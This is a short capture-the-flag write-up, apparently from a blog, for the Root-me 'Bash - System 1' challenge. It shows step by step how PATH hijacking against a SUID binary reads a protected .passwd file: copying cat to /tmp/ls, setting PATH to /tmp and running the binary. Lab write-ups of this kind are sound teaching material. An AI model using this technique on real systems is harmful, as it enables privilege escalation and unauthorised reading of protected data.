---
title: "Bash - System 1 - Root-me Write-up"
date: 2025-06-16
tags: ["Root-me Write-up"]
---

This challenge exploits a `PATH` environment variable manipulation vulnerability in a SUID binary.

The binary `ch11` is executed with elevated privileges and internally calls `ls` without an absolute path. Because of this, we can hijack the command that gets executed by manipulating the `PATH`.


**Goal**

Trick the binary into executing `cat` instead of `ls` to read the contents of a protected `.passwd` file.


**Exploitation Steps**

1. Copy `cat` to `/tmp/ls`

This makes sure that when `ls` is called, our fake version (which is actually `cat`) is executed:

```bash
app-script-ch11@challenge02:~$ cp /bin/cat /tmp/ls
```

2. Modify the PATH variable to prioritize /tmp

```bash
app-script-ch11@challenge02:~$ PATH=/tmp
app-script-ch11@challenge02:~$ echo $PATH
/tmp
```
3. Run the vulnerable binary
When ch11 runs ls, it will now execute /tmp/ls, which is actually cat. The result is that it prints the content of .passwd instead of listing directory contents.

```bash
app-script-ch11@challenge02:~$ ./ch11
```

**Conclusion**
This attack works because the binary uses ls without specifying the full path (e.g., /bin/ls). By changing the PATH, we inject our own malicious binary (in this case, a copy of cat), which gives us access to protected data.

This leverages several key concepts in Unix/Linux security:

- SUID (Set User ID) binaries allow users to run executables with the permissions of the file owner, which can lead to privilege escalation if not properly secured.

- Environment variable manipulation, particularly the PATH variable, can redirect command execution to unintended binaries.